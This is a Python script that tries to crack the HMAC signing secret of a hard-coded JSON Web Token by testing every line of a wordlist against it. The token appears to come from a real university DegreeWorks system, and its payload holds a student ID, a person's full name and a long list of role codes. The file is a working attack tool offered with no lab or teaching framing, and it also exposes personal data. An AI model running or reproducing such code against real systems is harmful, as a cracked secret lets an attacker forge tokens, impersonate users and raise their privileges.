import jwt

# The JWT token to verify
jwt_token = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIwMDEwNjE2NTIiLCJpbnRlcm5hbElkIjoiMDAxMDYxNjUyIiwidXNlckNsYXNzIjoiU1RVIiwiYXBwTmFtZSI6ImRlZ3JlZXdvcmtzIiwicm9sZXMiOlsiUlNQTEFOIiwiUlNTRVRUTkciLCJTREFVRElUIiwiU0RBVURSRVYiLCJTREdQQUFEViIsIlNER1BBQ0xDIiwiU0RHUEFHUkQiLCJTREdQQVRSTSIsIlNETE9LQUhEIiwiU0ROT1RFUyIsIlNETlRFVlVFIiwiU0RQRVRWRVciLCJTRFNUVU1FIiwiU0RXRUIzMSIsIlNEV0VCMzYiLCJTRFdIQVRJRiIsIlNEV09SS1MiLCJTRFhNTDMxIiwiU0VQUEFERCIsIlNFUFBBVUQiLCJTRVBQREVMIiwiU0VQUERFTEwiLCJTRVBQRURJVCIsIlNFUFBMQU4iLCJTRVBQTU9EIiwiU0VQUE5NQUQiLCJTRVBQTk1ETCIsIlNFUFBOTUVEIiwiU0VQUE5SQUQiLCJTRVBQTlJETCIsIlNFUFBOUkVEIiwiU0VQUE5UQUQiLCJTRVBQTlRETCIsIlNFUFBOVEVEIiwiU0VQUFJRQUQiLCJTRVBQUlFETCIsIlNFUFBSUUVEIiwiU0VQUFNFTCIsIlNFUFBUQUREIiwiU0VQUFRERUwiLCJTRVBQVEVNUCIsIlNFUFBUTU9EIiwiU0VQUFdJRiIsIlNFUFZBVUQiLCJTRVBWQ0FMIiwiU0VQVk5PVEUiXSwibmFtZSI6Ik93ZWgsIElmZWNodWt3dWRlbmkgVGVkZHkiLCJleHAiOjE2Nzg2MTcyOTQsImFsdElkIjoiQ0I4NDFBMkFGNDBDMkVBNEUwNTMyNzAxMDMwQTc1M0EiLCJpYXQiOjE2Nzg2MTU0OTQsImp0aSI6IjI4Zjc4OGNjLTAxZjMtNGI0NC1hYzBiLTRmMWUxOGNkYzk0MCJ9.4z3G7HLk_tWrtCQhRfZEcf_sXEsEYyrPxWIyB4ypigM'

# The secret to test against the JWT token
filename = 'jwt1.txt'

# Read the secrets from the file
with open(filename, 'r') as f:
    secrets = f.read().splitlines()

# Loop over the secrets and test them against the JWT token
num_found = 0
num_not_found = 0
for secret in secrets:
    num_found += 1
    print(f'{num_found} of {len(secrets)}' )
    try:

        decoded_token = jwt.decode(jwt_token, secret, algorithms=['HS256'])
        print(f"The secret '{secret}' is correct for the given JWT token.")
 
        break
    except:
       # print(f"The secret '{secret}' is not correct for the given JWT token.")
        num_not_found += 1